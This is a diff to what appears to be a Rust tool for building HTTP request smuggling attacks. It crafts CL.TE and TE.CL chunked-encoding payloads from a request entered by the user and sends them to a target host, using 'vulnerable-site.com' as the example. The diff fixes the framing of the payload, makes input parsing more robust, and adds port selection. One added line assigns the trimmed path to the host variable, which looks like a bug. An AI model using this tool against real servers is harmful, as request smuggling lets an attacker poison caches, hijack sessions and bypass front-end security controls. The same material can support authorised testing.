@@ -1,6 +1,7 @@
 use dns_lookup::lookup_host;
 use owo_colors::{OwoColorize, colors::*};
 use std::io::stdin;
+use std::net::SocketAddr;
 use std::path::PathBuf;
 use std::{error::Error, fs, net::IpAddr};
 
@@ -20,7 +21,8 @@ impl InputType {
                     "Failed to read line {} from user",
                     "file_path".fg::<Green>().bold()
                 ));
-                let path = PathBuf::from(path);
+
+                let path = PathBuf::from(path.trim());
                 let smuggled_request: Option<String> = match fs::read_to_string(&path) {
                     Ok(val) => Some(val),
                     Err(e) => {
@@ -32,12 +34,12 @@ impl InputType {
             }
             InputType::Stdio => {
                 let mut smuggled_request: String = String::new();
-                while true {
+                loop {
                     println!("Please input your desired request:");
                     std::io::stdin()
                         .read_line(&mut smuggled_request)
                         .expect("Failed to read data");
-
+                    let smuggled_request = smuggled_request.trim();
                     println!("Is the request correct : {:#?} [Y/N]", smuggled_request);
                     let mut choice: String = String::new();
                     stdin().read_line(&mut choice).expect(&format!(
@@ -69,7 +71,7 @@ impl SmuggleType {
             SmuggleType::CLTE => {
                 let chunk_body = "a";
                 let body = format!(
-                    "{:x}\r\n{}\r\n0\r\n{}",
+                    "{:x}\r\n{}\r\n0\r\n\r\n{}",
                     chunk_body.len(),
                     chunk_body,
                     smuggled_request
@@ -84,7 +86,7 @@ impl SmuggleType {
             SmuggleType::TECL => {
                 let body = format!("{}\r\n", smuggled_request);
                 let body_size = body.len();
-            
+
                 let content_length = format!("{:x}\r\n", body_size).len();
 
                 format!(
@@ -96,11 +98,12 @@ impl SmuggleType {
     }
 }
 
-pub fn check_host(ip_addr: &str) -> Result<IpAddr, Box<dyn Error>> {
+pub fn check_host(ip_addr: &str, ishttps: bool) -> Result<SocketAddr, Box<dyn Error>> {
     let ip = lookup_host(ip_addr)?
         .next()
         .ok_or("Couldnt find host address")?;
-    Ok(ip)
+    let port: u16 = if ishttps { 443 } else { 80 };
+    Ok(SocketAddr::from((ip, port)))
 }
 
 pub fn request_creator(smuggle_type: SmuggleType, input_type: InputType) -> Option<String> {
@@ -114,6 +117,7 @@ pub fn request_creator(smuggle_type: SmuggleType, input_type: InputType) -> Opti
         "Failed to read line {} from user",
         "path".fg::<Green>().bold()
     ));
+    let path = path.trim();
     println!(
         "Please input hostname to which you want to send the request to (example: {})",
         "vulnerable-site.com".fg::<Blue>().underline()
@@ -122,6 +126,7 @@ pub fn request_creator(smuggle_type: SmuggleType, input_type: InputType) -> Opti
         "Failed to read line {} from user",
         "host".fg::<Green>().bold()
     ));
+    let host = path.trim();
     if let Some(smuggled_request) = InputType::get_input(&input_type) {
         Some(SmuggleType::build_request(
             &smuggle_type,
